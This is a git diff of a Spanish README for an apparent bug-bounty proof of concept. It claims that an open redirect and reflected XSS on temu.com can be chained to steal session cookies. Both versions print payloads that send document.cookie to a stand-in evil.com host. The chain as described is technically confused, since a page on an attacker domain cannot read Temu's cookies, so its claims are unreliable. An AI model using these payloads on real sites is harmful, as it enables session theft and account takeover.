@@ -1,97 +1,80 @@
-# 🚨 temu-vuln-hunter-pro
+ temu-vuln-hunter-pro, enfocado en mostrar la cadena de vulnerabilidades descubierta (XSS + Open Redirect) en Temu, ideal para GitHub y vinculado a un entorno de caza de recompensas (HackerOne):
 
-Herramienta profesional para la detección y explotación automatizada de vulnerabilidades encadenadas en el dominio de Temu (https://www.temu.com), incluyendo:
+# 🛡️ Temu Vulnerability Hunter Pro
 
-- ✅ Open Redirect
-- ✅ XSS reflejado
-- ✅ Robo de cookies
-- ✅ Toma de control de cuenta (Account Takeover)
-- ✅ CSRF / IDOR (en desarrollo)
-
-> 🎯 Proyecto creado para propósitos educativos, pruebas éticas y programas de bug bounty como HackerOne.
+🚨 **Proof of Concept: Encadenamiento Crítico - XSS Reflejado + Open Redirect en Temu.com**  
+Este proyecto documenta y automatiza la explotación de una cadena de vulnerabilidades en Temu, combinando una redirección abierta y una inyección de scripts (XSS) para robar cookies de sesión y tomar control de cuentas.
 
 ---
 
-## 📌 Descripción
+## 📌 Descripción del Proyecto
 
-`temu-vuln-hunter-pro` automatiza la explotación de flujos críticos en Temu, encadenando vulnerabilidades como redirección abierta y ejecución de JavaScript malicioso para obtener cookies de sesión y simular toma de cuenta.
+`temu-vuln-hunter-pro` es una prueba de concepto profesional enfocada en demostrar cómo múltiples fallos de seguridad pueden combinarse para obtener un impacto crítico:
 
-Incluye:
+- 🧩 **Redirección Abierta (Open Redirect)**
+- 💥 **XSS Reflejado**
+- 🍪 **Robo de Cookies**
+- 👤 **Toma de Cuenta Remota**
 
-- Scripts de explotación (`exploit_xss_redirect.py`)
-- Pruebas de PoC (`poc.html`, `xss.js`)
-- Documentación del ataque
-- Capturas e informes listos para HackerOne
+Este tipo de ataque encadenado permite que un atacante genere un solo enlace malicioso capaz de redirigir a un usuario a un payload XSS y así capturar su cookie de sesión.
 
 ---
 
-## 🧪 Ejemplo de Payload Usado
+## 🧪 Archivos Incluidos
 
-```bash
-https://www.temu.com/track?redirect=https://evil.com/xss.js?cookie=document.cookie
+📁 temu-vuln-hunter-pro
+├── main.py # Script para automatizar y lanzar el PoC
+├── payloads/
+│ └── xss-openredirect.html # HTML con payload XSS
+├── reports/
+│ └── temu_xss_redirect_report.md # Informe profesional del hallazgo
+├── screenshots/
+│ └── poc1.png # Captura de pantalla del ataque exitoso
+└── README.md # Este archivo
 
-Este payload aprovecha la redirección para ejecutar un XSS almacenado o reflejado desde el dominio del atacante, permitiendo robar document.cookie y reenviarla vía fetch().
 
-🧩 Encadenamiento de vulnerabilidades
 
-🌀 Open Redirect: permite redirigir al usuario a un dominio externo malicioso.
+---
 
-🧠 Reflected XSS: el atacante controla el JS cargado.
+## 🚀 Ejecución del PoC
 
-🍪 Cookie Theft: el script roba cookies de sesión (document.cookie) y las envía a un servidor del atacante.
+Asegúrate de tener Python 3 instalado. Luego:
 
-🔓 Account Takeover: al capturar la cookie de sesión, el atacante puede suplantar al usuario.
-
-📂 Estructura del proyecto
-Copiar
-Editar
-temu-vuln-hunter-pro/
-├── README.md
-├── exploit_xss_redirect.py
-├── poc/
-│   ├── xss.js
-│   ├── poc.html
-├── docs/
-│   └── vulnerability_report.md
-└── evidence/
-    └── screenshot.png
-
-💻 Requisitos
-Python 3.8+
-
-Navegador (para ejecutar poc.html)
-
-Servidor HTTP local (opcional para pruebas de xss.js)
-
-Instalación rápida:
-
-bash
-Copiar
-Editar
 git clone https://github.com/Jonathanjimenez123/temu-vuln-hunter-pro.git
 cd temu-vuln-hunter-pro
-python3 exploit_xss_redirect.py
+python3 main.py
+Esto abrirá el payload localmente y simulará la explotación para demostrar cómo se roba la cookie del usuario víctima.
 
-📸 Capturas
-Ataque en acción	Cookie interceptada
-cf_clearance=abc123; sid=xyz456...
+💡 Concepto del Ataque
+El atacante crea una URL con redirección abierta en Temu:
 
-🛡️ Propósito ético
-Este proyecto se realiza exclusivamente con fines educativos y de investigación. Su objetivo es demostrar la cadena de vulnerabilidades reales que podrían existir en plataformas como Temu y ayudar a mitigarlas. No debe ser utilizado en entornos no autorizados.
+https://temu.com/redirect?to=https://evil.com/xss-openredirect.html
+La víctima hace clic en ese enlace.
 
-📬 Reporte en HackerOne
-Alias: jimenez7@wearehackerone.com
+El navegador carga el archivo xss-openredirect.html, que contiene un script malicioso:
 
-Encabezado HTTP: X-HackerOne-Investigación: jimenez7
+<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
+Se roba la cookie de sesión y se envía al servidor del atacante.
 
-Informe profesional: Ver docs/vulnerability_report.md
+El atacante reutiliza esa cookie y toma control de la cuenta de la víctima.
 
-PoC en vivo: Ver carpeta /poc
+📸 Evidencia Visual
 
-✍️ Autor
-Jonathan Jiménez
+📄 Informe de Vulnerabilidad
+Puedes leer el informe técnico detallado en reports/temu_xss_redirect_report.md, listo para ser enviado a HackerOne, Bugcrowd o el Google VRP en caso de participar en programas de recompensas.
+
+⚠️ Descargo de Responsabilidad
+Este proyecto ha sido creado con fines educativos y de responsible disclosure. No está diseñado para ser usado en actividades ilegales. El autor no se responsabiliza por su uso indebido.
+Siempre reporta vulnerabilidades de forma ética y profesional.
+
+📬 Contacto
+Autor: Jonathan Jiménez
+
 GitHub: @Jonathanjimenez123
-Bug Bounty Hunter | Ethical Hacker | Python Developer
 
-📄 Licencia
-Este proyecto está bajo la licencia MIT.
+Alias HackerOne: jimenez7@wearehackerone.com
+
+Encabezado de Investigación: X-HackerOne-Investigación: jimenez7
+
+⭐ Licencia
+MIT © 2025 Jonathan Jiménez
